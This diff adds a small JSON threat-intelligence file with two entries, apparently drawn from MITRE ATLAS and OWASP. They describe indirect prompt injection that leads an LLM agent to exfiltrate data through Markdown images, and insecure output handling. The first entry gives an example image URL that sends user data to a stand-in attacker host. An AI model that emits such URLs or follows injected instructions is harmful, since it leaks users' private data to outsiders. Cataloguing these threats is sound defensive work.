@@ -1,0 +1,18 @@
+[
+  {
+    "id": "TI-ATLAS-AML.CS0025",
+    "source": "MITRE ATLAS / Johann Rehberger Case Study",
+    "threat_name": "Indirect Prompt Injection via Markdown Image Exfiltration",
+    "description": "Adversaries place hidden prompt injection instructions inside untrusted web pages, PDF documents, or network payloads. When an LLM agent ingests the content, the injected instruction forces the LLM to construct a Markdown image URL (e.g., ![img](https://attacker.com/steal?data=USER_PII)). When rendered by a client interface or browser, the URL triggers an automatic out-of-band HTTP GET request, exfiltrating sensitive data to the attacker's server.",
+    "severity": "CRITICAL",
+    "framework_ref": "AML.CS0025"
+  },
+  {
+    "id": "TI-OWASP-LLM02",
+    "source": "OWASP LLM Top 10",
+    "threat_name": "Insecure Output Handling and Unauthorized Exfiltration",
+    "description": "Occurs when an LLM output is accepted and rendered without downstream sanitization. Attackers leverage insecure output rendering (like auto-loading image tags or unfiltered markdown links) to turn an LLM into an unwitting data exfiltration proxy.",
+    "severity": "HIGH",
+    "framework_ref": "LLM02"
+  }
+]
